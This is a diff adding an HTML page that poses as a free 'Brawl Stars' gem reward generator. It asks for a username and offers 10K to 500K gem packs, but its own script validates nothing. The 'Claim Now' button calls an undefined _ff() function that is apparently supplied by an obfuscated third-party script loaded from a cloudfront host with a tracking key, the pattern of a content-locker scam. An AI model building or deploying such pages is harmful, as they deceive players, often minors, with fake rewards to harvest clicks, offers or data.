@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Brawl Stars Reward</title>
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Press Start 2P', cursive;
+    }
+
+    body {
+      background: url('https://i.giphy.com/xXdG7DJMQA7333ZnCe.webp') no-repeat center center fixed;
+      background-size: cover;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* التعتيم والتضبيب بنسبة 80% */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(25px);
+      background-color: rgba(0, 0, 0, 0.75);
+      z-index: 0;
+    }
+
+    .reward-card {
+      max-width: 700px;
+      margin: 60px auto;
+      border-radius: 20px;
+      overflow: hidden;
+      position: relative;
+      background: rgba(30, 0, 50, 0.85);
+      border: 2px solid #ff00ffaa;
+      box-shadow: 0 0 25px #ff00ff66;
+      z-index: 1;
+    }
+
+    .hero-banner {
+      height: 220px;
+      background-image: url('https://d.top4top.io/p_3483xgn0d1.png');
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+
+    .hero-banner::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+
+ 
+    }
+
+    .content-area {
+      padding: 30px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 25px;
+    }
+
+    .username-input {
+      width: 100%;
+      padding: 16px 50px 16px 20px;
+      background: #150022;
+      border: 2px solid #ff8cff;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 13px;
+      outline: none;
+    }
+
+    .typing-indicator,
+    .validation-check {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+    }
+
+    .typing-indicator {
+      width: 20px;
+      height: 20px;
+      opacity: 0;
+      transition: 0.3s;
+    }
+
+    .validation-check {
+      font-size: 20px;
+      color: #00ffcc;
+      opacity: 0;
+    }
+
+    .rewards-title {
+      text-align: center;
+      color: #ff8cff;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .rewards-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 15px;
+    }
+
+    .reward-item {
+      background: linear-gradient(to bottom, #4b0082, #8a2be2);
+      border: 2px solid transparent;
+      border-radius: 12px;
+      padding: 14px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.3s;
+      color: #fff;
+    }
+
+    .reward-item:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 12px #ff8cffcc;
+    }
+
+    .reward-item.active {
+      border-color: #00ffc3;
+      box-shadow: 0 0 18px #00ffd599;
+    }
+
+    .reward-icon {
+      width: 36px;
+      height: 36px;
+      margin-bottom: 10px;
+    }
+
+    .reward-value {
+      font-size: 12px;
+    }
+
+    .claim-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      background: linear-gradient(to right, #ff00cc, #3333ff);
+      color: #fff;
+      font-weight: bold;
+      border-radius: 0 0 14px 14px;
+      cursor: pointer;
+      font-size: 13px;
+      letter-spacing: 1px;
+      animation: glow 2s infinite;
+      transition: 0.3s;
+    }
+
+    .claim-btn:hover {
+      background: linear-gradient(to right, #ff66ff, #6666ff);
+      transform: translateY(-2px);
+    }
+
+    @keyframes glow {
+      0% { box-shadow: 0 0 8px #ff00ff; }
+      50% { box-shadow: 0 0 16px #ff66ff; }
+      100% { box-shadow: 0 0 8px #ff00ff; }
+    }
+
+    @media (max-width: 600px) {
+      .content-area { padding: 20px; }
+      .reward-value { font-size: 11px; }
+      .claim-btn { font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="reward-card">
+    <div class="hero-banner"></div>
+    <div class="content-area">
+      <div class="input-group">
+        <input type="text" id="usernameInput" class="username-input" placeholder="Enter your username" />
+        <img src="https://media0.giphy.com/media/KspH5QowQs36gvKBoe/giphy.webp?cid=ecf05e4774r74qjgz1d8noll97oxe90ec8v5uon0b7vvkn8d&ep=v1_stickers_search&rid=giphy.webp&ct=s" class="typing-indicator" id="typingIndicator" />
+        <div class="validation-check">✓</div>
+      </div>
+
+      <div class="rewards-title">CHOOSE YOUR GEMES PACK</div>
+
+      <div class="rewards-grid">
+        <div class="reward-item">
+          <img class="reward-icon" src="https://armadaboost.com/storage/product/images/buy-brawl-stars-gems-armadaboost.png" />
+          <div class="reward-value">10K</div>
+        </div>
+        <div class="reward-item">
+          <img class="reward-icon" src="https://armadaboost.com/storage/product/images/buy-brawl-stars-gems-armadaboost.png" />
+          <div class="reward-value">50K</div>
+        </div>
+        <div class="reward-item">
+          <img class="reward-icon" src="https://armadaboost.com/storage/product/images/buy-brawl-stars-gems-armadaboost.png" />
+          <div class="reward-value">100K</div>
+        </div>
+        <div class="reward-item">
+          <img class="reward-icon" src="https://armadaboost.com/storage/product/images/buy-brawl-stars-gems-armadaboost.png" />
+          <div class="reward-value">500K</div>
+        </div>
+      </div>
+    </div>
+    <button class="claim-btn" onclick="_ff();">Claim Now</button>
+  </div>
+
+  <script>
+    const input = document.getElementById("usernameInput");
+    const typingIndicator = document.getElementById("typingIndicator");
+    const validationCheck = document.querySelector(".validation-check");
+
+    input.addEventListener("input", function () {
+      if (this.value.trim()) {
+        typingIndicator.style.opacity = "1";
+        validationCheck.style.opacity = "0";
+      } else {
+        typingIndicator.style.opacity = "0";
+        validationCheck.style.opacity = "0";
+      }
+    });
+
+    input.addEventListener("keypress", function (e) {
+      if (e.key === "Enter" && this.value.trim()) {
+        typingIndicator.style.opacity = "0";
+        validationCheck.style.opacity = "1";
+        e.preventDefault();
+      }
+    });
+
+  
+  </script>
+  <script type="text/javascript">
+    var mvgbn_Evp_jTNNFc={"it":4526492,"key":"9d1a1"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/beb15b6.js"></script>
+</body>
+</html>
